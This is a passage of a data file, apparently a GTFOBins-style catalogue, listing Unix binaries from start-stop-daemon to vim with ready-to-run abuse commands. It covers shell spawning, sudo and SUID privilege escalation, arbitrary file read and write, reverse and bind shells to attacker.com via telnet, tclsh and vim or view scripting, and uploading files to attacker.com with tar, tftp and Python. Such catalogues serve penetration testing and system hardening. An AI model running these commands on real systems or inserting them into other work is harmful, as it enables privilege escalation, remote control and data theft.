                ],
            },
        },
        "start-stop-daemon": {
            functions: {
                shell: [
                    {
                        code: "start-stop-daemon -n $RANDOM -S -x /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh",
                    },
                ],
            },
        },
        stdbuf: {
            functions: {
                shell: [
                    {
                        code: "stdbuf -i0 /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./stdbuf -i0 /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo stdbuf -i0 /bin/sh",
                    },
                ],
            },
        },
        strace: {
            functions: {
                "file-write": [
                    {
                        description:
                            "The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.",
                        code: "LFILE=file_to_write\nstrace -s 999 -o $LFILE strace - DATA\n",
                    },
                ],
                shell: [
                    {
                        code: "strace -o /dev/null /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./strace -o /dev/null /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo strace -o /dev/null /bin/sh",
                    },
                ],
            },
        },
        strings: {
            description: "This only returns ASCII strings, thus it is not suitable for binary files.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nstrings "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./strings "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo strings "$LFILE"\n',
                    },
                ],
            },
        },
        su: {
            functions: {
                sudo: [
                    {
                        code: "sudo su",
                    },
                ],
            },
        },
        sudo: {
            functions: {
                sudo: [
                    {
                        code: "sudo sudo /bin/sh",
                    },
                ],
            },
        },
        sysctl: {
            functions: {
                command: [
                    {
                        description: "The command is executed by root in the background when a core dump occurs.",
                        code: "COMMAND='/bin/sh -c id>/tmp/id'\nsysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.",
                        code: 'LFILE=file_to_read\n/usr/sbin/sysctl -n "/../../$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n",
                    },
                ],
                sudo: [
                    {
                        code: "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n",
                    },
                ],
            },
        },
        systemctl: {
            functions: {
                suid: [
                    {
                        code: "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n",
                    },
                    {
                        code: "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n",
                    },
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo systemctl\n!sh\n",
                    },
                ],
            },
        },
        "systemd-resolve": {
            functions: {
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo systemd-resolve --status\n!sh\n",
                    },
                ],
            },
        },
        tac: {
            description:
                "Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\"\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n",
                    },
                ],
            },
        },
        tail: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\ntail -c1G "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./tail -c1G "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo tail -c1G "$LFILE"\n',
                    },
                ],
            },
        },
        tar: {
            functions: {
                shell: [
                    {
                        code: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                    },
                    {
                        description: "This only works for GNU tar.",
                        code: "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'",
                    },
                    {
                        description:
                            "This only works for GNU tar. It can be useful when only a limited command argument injection is available.",
                        code: 'TF=$(mktemp)\necho \'/bin/sh 0<&1\' > "$TF"\ntar cf "$TF.tar" "$TF"\ntar xf "$TF.tar" --to-command sh\nrm "$TF"*\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).",
                        code: "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_send.tar\nLFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh\n",
                    },
                ],
                "file-download": [
                    {
                        description:
                            "This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).",
                        code: "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_get.tar\ntar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh\n",
                    },
                ],
                "file-write": [
                    {
                        description: "This only works for GNU tar.",
                        code: 'LFILE=file_to_write\nTF=$(mktemp)\necho DATA > "$TF"\ntar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P\n',
                    },
                ],
                "file-read": [
                    {
                        description: "This only works for GNU tar.",
                        code: 'LFILE=file_to_read\ntar xf "$LFILE" -I \'/bin/sh -c "cat 1>&2"\'\n',
                    },
                ],
                sudo: [
                    {
                        code: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                    },
                ],
            },
        },
        task: {
            functions: {
                shell: [
                    {
                        code: "task execute /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo task execute /bin/sh",
                    },
                ],
            },
        },
        taskset: {
            functions: {
                shell: [
                    {
                        code: "taskset 1 /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./taskset 1 /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo taskset 1 /bin/sh",
                    },
                ],
            },
        },
        tasksh: {
            functions: {
                shell: [
                    {
                        code: "tasksh\n!/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./tasksh\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo tasksh\n!/bin/sh\n",
                    },
                ],
            },
        },
        tbl: {
            description: "The read file content is corrupted by additional text at the beginning.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ntbl $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./tbl $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo tbl $LFILE\n",
                    },
                ],
            },
        },
        tclsh: {
            functions: {
                shell: [
                    {
                        code: "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\necho \'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh\n',
                    },
                ],
                suid: [
                    {
                        code: "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
                    },
                ],
            },
        },
        tcpdump: {
            description:
                "These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.\n\nIn recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.\n",
            functions: {
                command: [
                    {
                        code: "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n",
                    },
                ],
            },
        },
        tdbtool: {
            functions: {
                shell: [
                    {
                        code: "tdbtool\n! /bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo tdbtool\n! /bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./tdbtool\n! /bin/sh\n",
                    },
                ],
            },
        },
        tee: {
            description: "It can only append data if the destination exists.",
            functions: {
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_write\necho DATA | sudo tee -a "$LFILE"\n',
                    },
                ],
            },
        },
        telnet: {
            functions: {
                shell: [
                    {
                        description: "BSD version only. Needs to be connected first.",
                        code: "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF\n",
                    },
                ],
                sudo: [
                    {
                        description: "BSD version only. Needs to be connected first.",
                        code: "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        description: "BSD version only. Needs to be connected first.",
                        code: "RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh\n",
                    },
                ],
            },
        },
        terraform: {
            functions: {
                "file-read": [
                    {
                        code: 'terraform console\nfile("file_to_read")\n',
                    },
                ],
                sudo: [
                    {
                        code: 'sudo terraform console\nfile("file_to_read")\n',
                    },
                ],
                suid: [
                    {
                        code: './terraform console\nfile("file_to_read")\n',
                    },
                ],
            },
        },
        tex: {
            functions: {
                shell: [
                    {
                        code: "tex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./tex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
            },
        },
        tftp: {
            functions: {
                "file-upload": [
                    {
                        description: "Send local file to a TFTP server.",
                        code: "RHOST=attacker.com\ntftp $RHOST\nput file_to_send\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file from a TFTP server.",
                        code: "RHOST=attacker.com\ntftp $RHOST\nget file_to_get\n",
                    },
                ],
                suid: [
                    {
                        description: "Send local file to a TFTP server.",
                        code: "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n",
                    },
                ],
                sudo: [
                    {
                        description: "Send local file to a TFTP server.",
                        code: "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n",
                    },
                ],
            },
        },
        tic: {
            description:
                "The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\ntic -C "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./tic -C "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo tic -C "$LFILE"\n',
                    },
                ],
            },
        },
        time: {
            description:
                "Note that the shell might have its own builtin time implementation, which may behave differently than` /usr/bin/time`, hence the absolute path.",
            functions: {
                shell: [
                    {
                        code: "/usr/bin/time /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./time /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo /usr/bin/time /bin/sh",
                    },
                ],
            },
        },
        timedatectl: {
            description:
                "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n",
            functions: {
                shell: [
                    {
                        code: "timedatectl list-timezones\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo timedatectl list-timezones\n!/bin/sh\n",
                    },
                ],
            },
        },
        timeout: {
            functions: {
                shell: [
                    {
                        code: "timeout 7d /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./timeout 7d /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo timeout --foreground 7d /bin/sh",
                    },
                ],
            },
        },
        tmate: {
            functions: {
                shell: [
                    {
                        code: "tmate -c /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo tmate -c /bin/sh",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./tmate -c /bin/sh",
                    },
                ],
            },
        },
        tmux: {
            functions: {
                "file-read": [
                    {
                        description:
                            "The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.",
                        code: "LFILE=file_to_read\ntmux -f $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "tmux",
                    },
                    {
                        description: "Provided to have enough permissions to access the socket.",
                        code: "tmux -S /path/to/socket_name\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo tmux",
                    },
                ],
            },
        },
        top: {
            description:
                "This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples.",
            functions: {
                shell: [
                    {
                        code: "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This requires that the root configuration file is writable and might be used to persist elevated privileges.",
                        code: "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n",
                    },
                ],
            },
        },
        torify: {
            functions: {
                shell: [
                    {
                        code: "torify /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo torify /bin/sh",
                    },
                ],
            },
        },
        torsocks: {
            functions: {
                shell: [
                    {
                        code: "torsocks /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo torsocks /bin/sh",
                    },
                ],
            },
        },
        troff: {
            description:
                "The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ntroff $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./troff $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo troff $LFILE\n",
                    },
                ],
            },
        },
        tshark: {
            description: "This program is able to execute [`lua`](/gtfobins/less/) code.",
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\ntshark -Xlua_script:$TF\n",
                    },
                ],
            },
        },
        ul: {
            description:
                "The read file content is corrupted by replacing occurrences of `$'\\b_'` to terminal sequences and by converting tabs to spaces.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nul "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./ul "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo ul "$LFILE"\n',
                    },
                ],
            },
        },
        unexpand: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nunexpand -t99999999 "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./unexpand -t99999999 "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo unexpand -t99999999 "$LFILE"\n',
                    },
                ],
            },
        },
        uniq: {
            description: "The read file content is corrupted by squashing multiple adjacent lines.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nuniq "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./uniq "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo uniq "$LFILE"\n',
                    },
                ],
            },
        },
        unshare: {
            functions: {
                shell: [
                    {
                        code: "unshare /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./unshare -r /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo unshare /bin/sh",
                    },
                ],
            },
        },
        unsquashfs: {
            description:
                "`unsquashfs` preserve the SUID bit when extracting the file system. Prepare an archive beforehand with the following commands as root:\n\n```\ncp /bin/sh .\nchmod +s sh\nmksquashfs sh shell\n```\n\nExtract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).\n",
            functions: {
                sudo: [
                    {
                        code: "sudo unsquashfs shell\n./squashfs-root/sh -p\n",
                    },
                ],
                suid: [
                    {
                        code: "./unsquashfs shell\n./squashfs-root/sh -p\n",
                    },
                ],
            },
        },
        unzip: {
            description:
                "Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:\n\n```\ncp /bin/sh .\nchmod +s sh\nzip shell.zip sh\n```\n\nExtract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).\n",
            functions: {
                sudo: [
                    {
                        code: "sudo unzip -K shell.zip\n./sh -p\n",
                    },
                ],
                suid: [
                    {
                        code: "./unzip -K shell.zip\n./sh -p\n",
                    },
                ],
            },
        },
        "update-alternatives": {
            functions: {
                sudo: [
                    {
                        description: "Write in `$LFILE` a symlink to `$TF`.",
                        code: 'LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install "$LFILE" x "$TF" 0\n',
                    },
                ],
                suid: [
                    {
                        description: "Write in `$LFILE` a symlink to `$TF`.",
                        code: 'LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install "$LFILE" x "$TF" 0\n',
                    },
                ],
            },
        },
        uudecode: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo uuencode "$LFILE" /dev/stdout | uudecode\n',
                    },
                ],
            },
        },
        uuencode: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo uuencode "$LFILE" /dev/stdout | uudecode\n',
                    },
                ],
            },
        },
        vagrant: {
            description: "This allows to execute [`ruby`](/gtfobins/ruby/) code, other functions may apply.",
            functions: {
                shell: [
                    {
                        code: "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n",
                    },
                ],
                sudo: [
                    {
                        code: "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n",
                    },
                ],
                suid: [
                    {
                        code: "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n",
                    },
                ],
            },
        },
        valgrind: {
            functions: {
                shell: [
                    {
                        code: "valgrind /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo valgrind /bin/sh",
                    },
                ],
            },
        },
        varnishncsa: {
            description:
                "This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start `varnishncsa` as follows, then trigger the file write with:\n\n```\ncurl -H 'yyy: DATA' http://localhost:6081/xxx\n```\n",
            functions: {
                sudo: [
                    {
                        code: "LFILE=file_to_write\nsudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_write\n./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n",
                    },
                ],
            },
        },
        vi: {
            description: "Modern Unix systems run [`vim`](/gtfobins/vim/) binary when `vi` is called.",
            functions: {
                shell: [
                    {
                        code: "vi -c ':!/bin/sh' /dev/null",
                    },
                    {
                        code: "vi\n:set shell=/bin/sh\n:shell\n",
                    },
                ],
                "file-write": [
                    {
                        code: "vi file_to_write\niDATA\n^[\nw\n",
                    },
                ],
                "file-read": [
                    {
                        code: "vi file_to_read",
                    },
                ],
                sudo: [
                    {
                        code: "sudo vi -c ':!/bin/sh' /dev/null",
                    },
                ],
            },
        },
        view: {
            functions: {
                shell: [
                    {
                        code: "view -c ':!/bin/sh'",
                    },
                    {
                        code: "view\n:set shell=/bin/sh\n:shell\n",
                    },
                    {
                        description:
                            "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'view -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `view` is compiled with Lua support.",
                        code: "view -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nview -c \':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\nvim.command(":q!")\'\n',
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description:
                            "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nview -c \':lua local s=require("socket"); local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));t:send(b);\n  end;\n  f:close();t:close();\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description:
                            "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
                        code: 'export LPORT=12345\nview -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));c:send(b);\n  end;c:close();f:close();\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\nview -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\nview -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nview -c \':lua local f=io.open(os.getenv("LFILE"), \'rb\')\n  local d=f:read("*a")\n  io.close(f);\n  local s=require("socket");\n  local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  t:send(d);\n  t:close();\'\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nview -c \':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\nvim.command(":q!")\'\n',
                    },
                    {
                        description:
                            'Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.',
                        code: 'export LPORT=12345\nexport LFILE=file_to_save\nview -c \':lua local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  local d,x=c:receive("*a");\n  c:close();\n  local f=io.open(os.getenv("LFILE"), "wb");\n  f:write(d);\n  io.close(f);\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: "view file_to_write\niDATA\n^[\nw!\n",
                    },
                ],
                "file-read": [
                    {
                        code: "view file_to_read",
                    },
                ],
                "library-load": [
                    {
                        description:
                            "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'view -c \':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")\'',
                    },
                ],
                suid: [
                    {
                        description:
                            "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './view -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
                    },
                ],
                sudo: [
                    {
                        code: "sudo view -c ':!/bin/sh'",
                    },
                    {
                        description:
                            "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'sudo view -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `view` is compiled with Lua support.",
                        code: "sudo view -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                capabilities: [
                    {
                        description:
                            "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: './view -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                ],
                "limited-suid": [
                    {
                        description: "This requires that `view` is compiled with Lua support.",
                        code: "./view -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
            },
        },
        vigr: {
            description:
                "This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.",
            functions: {
                suid: [
                    {
                        code: "./vigr",
                    },
                ],
                sudo: [
                    {
                        code: "sudo vigr",
                    },
                ],
            },
        },
        vim: {
            functions: {
                shell: [
                    {
                        code: "vim -c ':!/bin/sh'",
                    },
                    {
                        code: "vim --cmd ':set shell=/bin/sh|:shell'",
                    },
                    {
                        description:
                            "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
                        code: 'vim -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
                    },
                    {
                        description: "This requires that `vim` is compiled with Lua support.",
                        code: "vim -c ':lua os.execute(\"reset; exec sh\")'",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nvim -c \':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\nvim.command(":q!")\'\n',
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description:
                            "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
